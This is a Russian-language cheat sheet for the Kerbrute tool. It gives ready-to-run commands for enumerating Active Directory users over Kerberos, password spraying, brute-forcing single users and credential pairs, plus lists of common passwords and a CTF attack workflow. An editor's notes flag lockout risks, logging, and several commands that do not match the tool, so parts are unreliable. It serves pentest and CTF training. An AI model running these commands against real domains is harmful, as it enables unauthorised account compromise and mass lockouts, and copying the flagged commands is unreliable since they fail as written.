<a id="-kerbrute---kerberos-user-enumeration"></a>
# 🔑 Kerbrute — перечисление пользователей через Kerberos

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md) • [🏠 Русская главная](../../README.ru.md)

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Kerberos Pre-Auth Bruteforcing Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое Kerbrute](#-what-is-kerbrute)
- [Установка](#-installation)
- [Перечисление пользователей](#-user-enumeration)
- [Password spraying](#-password-spraying)
- [Перебор паролей](#-brute-force)
- [Краткий справочник](#-quick-reference)

---

<a id="-what-is-kerbrute"></a>
## 🎯 Что такое Kerbrute

**Kerbrute** использует особенности предварительной аутентификации Kerberos (pre-authentication), чтобы перечислять пользователей и проверять один пароль для нескольких учётных записей:

- 🔍 **Перечисление пользователей** — поиск существующих имён без учётных данных!
- 🔐 **Password spraying** — проверка одного пароля для нескольких пользователей
- 💥 **Перебор** — проверка учётных данных
- 🚫 **Нет риска блокировки** — ошибки pre-auth не вызывают блокировку

<a id="why-kerbrute"></a>
### Зачем использовать Kerbrute?

> **Исправление оригинала:** отсутствие ошибок входа относится к `userenum`, который запрашивает ответ KDC без проверки пароля. Ошибочные пароли в passwordspray и переборе увеличивают счётчик неудачных входов и могут блокировать учётные записи. Поэтому строка «нет риска блокировки» и таблица ниже не применимы ко всем режимам. См. [README Kerbrute](https://github.com/ropnop/kerbrute#usage).

| Метод | Вызывает блокировку | Запись в журналах |
|--------|------------------|----------------|
| LDAP Bind | Да | Да |
| Аутентификация SMB | Да | Да |
| **Предварительная аутентификация Kerberos** | **Нет** | Минимальная |

---

<a id="-installation"></a>
## 🚀 Установка

> **Журналирование:** малая заметность не означает отсутствия событий. Регистрация зависит от политики аудита; ошибки предварительной аутентификации могут фиксироваться событием 4771 на контроллере домена. См. [документацию Microsoft](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4771).

<a id="download-binary"></a>
### Загрузка исполняемого файла

> **Версия:** ссылки ниже закреплены на v1.0.3; это не обозначение автоматически выбранного последнего релиза. Актуальные сборки перечислены в [официальных релизах](https://github.com/ropnop/kerbrute/releases).

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

<a id="from-source"></a>
### Из исходного кода

```bash
go install github.com/ropnop/kerbrute@latest
```

<a id="verify"></a>
### Проверка

```bash
kerbrute --help
```

---

<a id="-user-enumeration"></a>
## 🔍 Перечисление пользователей

<a id="basic-usage"></a>
### Основы использования

```bash
# Перечислить пользователей из словаря
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# С именем контроллера домена
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

<a id="output-options"></a>
### Параметры вывода

> **Совместимость:** `--json` отсутствует в рассматриваемом парсере Kerbrute; `-o` сохраняет текстовый журнал, а не задаёт JSON. Команда оригинала сохранена. См. [парсер](https://github.com/ropnop/kerbrute/blob/master/cmd/kerbrute.go) и [реализацию журнала](https://github.com/ropnop/kerbrute/blob/master/util/log.go).

```bash
# Подробный вывод
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Вывод в файл
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# Вывод JSON
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

<a id="threading"></a>
### Параллельные потоки

> **Потоки и задержка:** документация описывает `--delay` как режим с одним потоком, поэтому сочетание с `-t 20` не стоит трактовать как гарантию 20 одновременных запросов. Реализацию и поведение нужно сверять для своей версии; подпись «безопасно» не гарантирует отсутствия блокировок или обнаружения. См. [описание параметров](https://github.com/ropnop/kerbrute#usage) и [исходный код](https://github.com/ropnop/kerbrute/blob/master/cmd/kerbrute.go).

```bash
# Увеличить число потоков (по умолчанию: 10)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# Потоки с пониженной активностью
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

<a id="sample-output"></a>
### Пример вывода

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

<a id="-password-spraying"></a>
## 🔐 Password spraying — один пароль для нескольких учётных записей

<a id="basic-spray"></a>
### Базовый password spraying

```bash
# Один пароль для нескольких пользователей
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# Из файла
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

<a id="multiple-passwords"></a>
### Несколько паролей

```bash
# Проверять несколько паролей (по одному за раз!)
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # Пауза 5 минут между проверками
done
```

<a id="output"></a>
### Вывод

```bash
# Вывести действительные учётные данные
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

<a id="sample-output-1"></a>
### Пример вывода

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

<a id="safe-spraying"></a>
### Password spraying с учётом блокировки

> **Политика и паузы:** `--password-policy` отсутствует в парсере LDAP архивного CME; показанная проверка может завершиться ошибкой. См. [парсер CME](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/ldap/proto_args.py). Пауза 300 секунд в предыдущем цикле и `--delay` не гарантируют защиты от блокировки: это зависит от политики и других попыток входа. См. [предупреждение Kerbrute](https://github.com/ropnop/kerbrute#password-spray).

```bash
# Сначала проверить политику паролей!
crackmapexec ldap DC01 -u user -p pass --password-policy

# Медленно и с небольшим числом потоков
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

<a id="-brute-force"></a>
## 💥 Перебор паролей

<a id="full-brute-force"></a>
### Полный перебор

> **Уточнение:** `bruteuser` проверяет словарь паролей для одного пользователя, указанного последним аргументом; подпись «все комбинации username:password» неточна. См. [исходный код команды](https://github.com/ropnop/kerbrute/blob/master/cmd/bruteuser.go).

```bash
# Проверить все комбинации username:password
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

<a id="combined-list"></a>
### Список пар «пользователь:пароль»

```bash
# Использовать формат username:password
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# Формат creds.txt:
# admin:Password1
# john:Summer2024
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="commands"></a>
### Команды

| Команда | Описание |
|---------|-------------|
| `userenum` | Перечислить существующие имена пользователей |
| `passwordspray` | Проверить пароль для нескольких пользователей |
| `bruteuser` | Перебрать пароли одного пользователя |
| `bruteforce` | Проверить пары user:pass |

<a id="essential-options"></a>
### Основные параметры

| Параметр | Описание |
|--------|-------------|
| `-d` | Имя домена |
| `--dc` | IP-адрес или имя контроллера домена |
| `-t` | Число потоков (по умолчанию: 10) |
| `-o` | Файл вывода |
| `-v` | Подробный вывод |
| `--delay` | Задержка между попытками (мс) |

<a id="user-enumeration"></a>
### Перечисление пользователей

```bash
# Базовый вариант
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# С сохранением вывода
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# Быстрый вариант
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

<a id="password-spray"></a>
### Password spraying

```bash
# Базовый password spraying
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# Password spraying с пониженной активностью
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

<a id="wordlists-for-user-enum"></a>
### Словари для перечисления пользователей

```bash
# Распространённые имена
/usr/share/seclists/Usernames/Names/names.txt

# Популярные имена пользователей
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Собственный формат
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

<a id="common-passwords"></a>
### Распространённые пароли

```
Season+Year: Summer2024!, Winter2024!, Fall2024!
Company+Num: CompanyName123!, Company2024!
Generic: Password1, Welcome1, P@ssw0rd
```

---

<a id="-ctf-tips"></a>
## 🎯 Советы для CTF

1. **Сначала перечисляйте пользователей** — имена можно получить без учётных данных!
2. **Проверяйте AS-REP** — после поиска пользователей проверьте, у кого отключена preauth
3. **Применяйте password spraying осторожно** — один пароль, затем пауза
4. **Проверяйте политику** — учитывайте порог блокировки
5. **Используйте задержку** — для снижения заметности

<a id="workflow"></a>
### Последовательность работы

> **Связность примера:** `-o users.txt` создаёт журнал с отметками времени и сообщениями, а не чистый список имён. Поэтому следующий шаг с `-usersfile users.txt` нельзя считать готовой цепочкой без подготовки подходящего входного файла. Исходные команды сохранены; см. [реализацию вывода](https://github.com/ropnop/kerbrute/blob/master/util/log.go) и [userenum](https://github.com/ropnop/kerbrute/blob/master/cmd/userenum.go).

```bash
# 1. Перечислить пользователей
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. Проверить учётные записи для AS-REP roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. Выполнить password spraying
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [Kerbrute на GitHub](https://github.com/ropnop/kerbrute)
- [Блог ropnop](https://blog.ropnop.com/)

<a id="related-cheatsheets"></a>
### Связанные шпаргалки
- [Методология атак на AD](../../AD-Attack-Methodology/translations/README.ru.md)
- [Rubeus](../../Rubeus/translations/README.ru.md)
- [CrackMapExec](../../CrackMapExec/translations/README.ru.md)

---

<p align="center">
  <b>🔑 Перечисляйте пользователей и проверяйте пароли!</b><br>
  <i>Kerbrute — путь к доступу с пониженной заметностью</i>
</p>
